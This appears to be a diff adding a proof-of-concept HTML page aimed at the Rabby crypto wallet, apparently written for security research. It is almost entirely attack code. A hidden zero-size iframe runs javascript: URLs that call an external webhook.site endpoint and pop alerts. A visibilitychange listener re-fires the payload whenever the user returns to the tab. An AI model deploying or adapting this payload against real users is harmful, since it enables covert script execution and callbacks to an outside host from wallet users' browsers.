@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en-US">
+    <body>
+        <center>
+            <br />
+            <h1>Rabby Wallet - Visibility Change UI Trigger</h1>
+        </center>
+
+        <iframe id="iframe"></iframe>
+    </body>
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, user-scalable=no" />
+        <title>visibilitychange UI Trigger</title>
+
+        <style>
+            iframe {
+                visibility: hidden;
+                width: 0;
+                height: 0;
+            }
+        </style>
+
+        <script>
+            const iframe = document.getElementById("iframe");
+            iframe.src = `
+                        javascript:fetch("https://webhook.site/b64206bc-27c5-45b4-a4d8-4a552688d9a1");alert('第一次弹窗')
+                    `;
+
+            let armed = false;
+
+            document.addEventListener("visibilitychange", function () {
+                // Tahap 1: halaman disembunyikan (tab pindah / minimize)
+                if (document.visibilityState === "hidden") {
+                    armed = true;
+                    return;
+                }
+
+                // Tahap 2: halaman terlihat lagi → trigger
+                if (document.visibilityState === "visible" && armed) {
+                    armed = false; // reset supaya bisa dipakai lagi
+
+                    const iframe = document.getElementById("iframe");
+                    iframe.src = `
+                        javascript:fetch("https://webhook.site/b64206bc-27c5-45b4-a4d8-4a552688d9a1");alert()
+                    `;
+                }
+            });
+        </script>
+    </head>
+
+
+</html>
